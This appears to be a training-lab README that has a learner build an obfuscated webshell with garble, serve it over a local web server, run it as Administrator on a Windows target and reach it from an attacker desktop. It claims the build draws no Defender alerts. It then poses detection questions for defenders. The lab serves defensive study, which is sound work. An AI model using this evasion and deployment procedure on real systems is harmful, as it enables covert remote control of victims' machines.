# Webshell

Standard web shell that will run on linux or windows, listening for connections.

1. First you need to create a new version of the file with binary obfuscation. In the **Attack Desktop** open a terminal.
2. Change to the workshop directory hosting the ironcat_attack modules.
`cd /home/pslearner/workshop/webshell/ironcat_attack`
3. From here run the generate_payload.sh script agains the /webshell/webshell.go file.
`garble -tiny -literals -seed=random build -ldflags='-s -w' webshell.go`
4. This will generate the new .exe in the folder and host it for you on a simple web server.
`python3 -m http.server`
5. Now, open the **Windows Target** device.
6. Open Firefox.
7. Browse to the Attack Desktop at **http://172.31.24.10:8000**
8. Navigate to the webshell.exe file, and click it to download.
9. Open the command prompt by right clicking the dektop icon and choosing "Run as Administrator"
10. Change directory to the newly downloaded file. `cd c:\Users\pslearner.PS-WIN-1\Downloads\`
11. Run the webshell, using any arguments you would like.  As long as there are two. ex. `webshell.exe meow meow`
12. Open a firefox browser and browse to http://localhost:59679
13. Ta Da! I present to you webshel...with no defender alerts.
14. To properly simulate activity, swap to the Attacker Desktop.
15. Open a browser with the browser icon in the bottom of the screen.
16. Browse to 172.31.24.20:59679.  And you have now access the webshell the same way an attacker would.
17. Run a few commands, like `whoami` or `dir`


## Recommended tools
- Netstat & Powershell
- Wireshark
- Sysmon
- Velocirpator


## Questions to Ask
- Can you identify the malicous connections without prior knowledge? What is odd about the Network Tuple?
- What can you do from a network perpsective to signature this activity across your environment?
- What had to be true for you to access this from outside the device?
- Can you identify any names that would be associated with initial acitivty?

Once you are done answering the questions for yourself, check out some of the IOCs I identify for this activity here:

[WebShell IOCs](./webshell_iocs.md)






